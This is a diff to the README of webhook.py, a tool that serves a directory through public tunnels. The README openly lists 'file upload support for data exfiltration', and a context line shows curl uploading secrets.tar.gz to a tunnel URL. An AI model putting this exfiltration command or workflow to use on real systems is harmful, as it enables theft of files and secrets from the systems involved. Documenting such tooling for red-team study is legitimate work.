@@ -60,6 +60,45 @@ It’s especially useful for:
 
 ---
 
+
+## 🚀 Banner
+```bash
+ python3 webhook.py -h
+
+     .->    (`-')  _<-.(`-')  (`-').->                      <-.(`-')  
+ (`(`-')/`) ( OO).-/ __( OO)  (OO )__      .->        .->    __( OO)  
+,-`( OO).',(,------.'-'---.\ ,--. ,'-'(`-')----. (`-')----. '-'. ,--. 
+|  |\\  |  | |  .---'| .-. (/ |  | |  |( OO).-.  '( OO).-.  '|  .'   / 
+|  | '.|  |(|  '--. | '-' `.)|  `-'  |( _) | |  |( _) | |  ||      /) 
+|  |.'.|  | |  .--' | /`'.  ||  .-.  | \\|  |)|  | \\|  |)|  ||  .   '  
+|   ,'.   | |  `---.| '--'  /|  | |  |  '  '-'  '  '  '-'  '|  |\\   \\ 
+`--'   '--' `------'`------' `--' `--'   `-----'    `-----' `--' '--' 
+     Author: l0n3m4n | Version: 1.1.3 | Tunneling local Server 
+
+usage: webhook.py [-h] [-p PORT] [-d DIRECTORY] (--serveo | --cloudflared | --ngrok | --localtunnel)
+                  [--exiftool]
+
+📡 Serve a local directory and expose it via a tunnel (Serveo, Cloudflared, Ngrok, LocalTunnel).
+
+options:
+  -h, --help            show this help message and exit
+  -p, --port PORT       Local port to serve (default: 80)
+  -d, --directory DIRECTORY
+                        Directory to serve (default: current dir)
+  --serveo              Use Serveo tunnel
+  --cloudflared         Use Cloudflared tunnel
+  --ngrok               Use Ngrok tunnel
+  --localtunnel         Use LocalTunnel tunnel
+  --exiftool            Use ExifTool for metadata extraction
+
+
+    Examples:                                                                                         
+      python3 webhook.py -p 8080 --serveo --exiftool                                        
+      python3 webhook.py -p 80 -d /var/www/html --cloudflared                                          
+      python3 webhook.py -p 3000 -d ~/my-site --ngrok                                                 
+      python3 webhook.py -p 8080 -d ~/my-site --localtunnel 
+```
+
 ## 🛠 Requirements
 
   - Python 3.6+
@@ -69,6 +108,7 @@ It’s especially useful for:
       * cloudflared (fallback if Serveo fails)
       * ngrok (optional)
       * localtunnel (optional)
+      * exiftool
 
 ---
 
@@ -77,13 +117,11 @@ It’s especially useful for:
 ```bash
 # Clone the repo
 git clone https://github.com/l0n3m4n/webhook.git
-cd webhook
+cd webhook 
+pip install -r requirements.txt --break-system-packages
 
 # Make it executable
-chmod +x webhook.py
-
-# (Optional) Install cloudflared if not using Serveo
-sudo apt install cloudflared  # Or follow: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/
+chmod +x webhook.py 
 ```
 
 ## 🐧 Kali linux (debian,ubuntu)
@@ -142,7 +180,7 @@ curl -F "file=@secrets.tar.gz" https://abc123.cloudflareTunnel.com/upload
 ### 🌐 Server Features
 - [x] Display public tunnel URL clearly
 - [x] Serve files from a specified directory
-- [ ] Web-based directory listing with download buttons
+- [x] Web-based directory listing with download buttons
 - [x] File upload support for data exfiltration
 - [x] Log incoming HTTP requests (IP, User-Agent, Time)
 
